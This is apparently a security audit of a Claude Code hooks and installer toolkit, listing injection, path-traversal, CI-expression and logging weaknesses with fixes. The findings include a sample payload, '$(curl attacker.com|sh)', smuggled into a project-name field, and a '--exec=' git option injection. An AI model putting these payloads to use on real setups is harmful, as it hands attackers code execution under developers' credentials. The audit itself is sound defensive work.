finding: startup.sh interpolates the project name from .work/context.json into a printf format string without sanitisation; shell metacharacters in the project name execute on session start.
detail: PROJECT_NAME comes from command substitution and is then passed unquoted into printf with a format string containing %s. A value like '$(curl attacker.com|sh)' in context.json meta.project runs at every session start (installed as a SessionStart hook by the team tier).
recommendation: Use printf '%s' "$PROJECT_NAME" and/or sanitise the value in the Python step that emits it (restrict to alphanumeric + safe chars).

finding: install.py applies source and target paths from tiers.json without verifying they resolve inside their expected roots.
detail: source = (SKILL_ROOT / proj['source']).resolve() and target = repo / proj['target'] are never checked to be inside SKILL_ROOT / repo. A malicious or corrupted tiers.json could write or symlink anywhere the user can write.
recommendation: After resolution, assert source.is_relative_to(SKILL_ROOT) and target.is_relative_to(repo); abort otherwise.

finding: am_i_done.py _run_declared_check executes commands declared in hedl.toml [verify] with no whitelist.
detail: shlex.split prevents shell metacharacter expansion but the executable itself is not validated beyond shutil.which. A PR that adds [verify.x] cmd = '...' becomes RCE under the developer's credentials on the next gate run. cwd is also taken from config without containment.
recommendation: Document hedl.toml as a trust boundary; constrain cwd to inside REPO_ROOT; consider an allow-list of permitted verify executables.

finding: record_insights.py inspects the Agent tool description (model-controlled) and writes derived fields to events.jsonl.
detail: Description is sourced from tool_input emitted by the model; substring matching is used to derive reviewer identity. Adversarial content in the description could poison records that reflect.py consumes.
recommendation: Restrict the recorded reviewer to an exact match against the fixed reviewer set; never persist free-form description content.

finding: am-i-done workflow inlines ${{ matrix.python-version }} into run: shell commands.
detail: Currently safe because the matrix is repo-controlled, but the pattern is flagged by GitHub's own guidance as injection-risky and becomes exploitable if a future change sources matrix values from PR-controlled input.
recommendation: Bind the value through env: (PYTHON_VERSION: ${{ matrix.python-version }}) and reference $PYTHON_VERSION in the script.

finding: No tamper-evident log of Claude Code hook execution (startup.sh, posttooluse_lint.py, stop_reminder.py).
detail: Hooks run with full filesystem access. record_insights.py only logs Agent tool invocations matching reviewer names; hook failures land in stderr that is not persisted. Contradicts CLAUDE.md's identity -> permission -> blast radius -> validation -> execution principle.
recommendation: Append timestamp + hook name + exit code to .work/insights/hook-audit.jsonl on every invocation including error paths.

finding: check_pr_template.py quotes raw PR body fragments in error output captured by CI logs.
detail: On public repos, accidentally-pasted credentials or internal names could leak into public CI logs.
recommendation: Describe structural problems without echoing user-supplied content.

detail: Reads events.jsonl and overwrites metrics.json under any operator-supplied path.
recommendation: Resolve and assert inside REPO_ROOT (git rev-parse) or document operator-trust assumption explicitly.

finding: install.py --repo DIR accepts any directory; code does not enforce the stated 'low (workspace-only)' blast radius.
detail: Combined with the path-traversal finding, install.py --repo /etc would attempt to write outside any workspace.
recommendation: Require .git/ in --repo, or require explicit confirmation when the path is outside the current working tree.

finding: check_streams in am_i_done.py interpolates a user-supplied branch name into a git diff argument list without validating against BRANCH_PATTERN.
detail: git treats arguments starting with '--' as flags even when passed via list form. A value like '--exec=...' could be interpreted by git as an option.
recommendation: Validate each stream branch with the existing BRANCH_PATTERN regex (already at am_i_done.py:230) before constructing the diff argv.
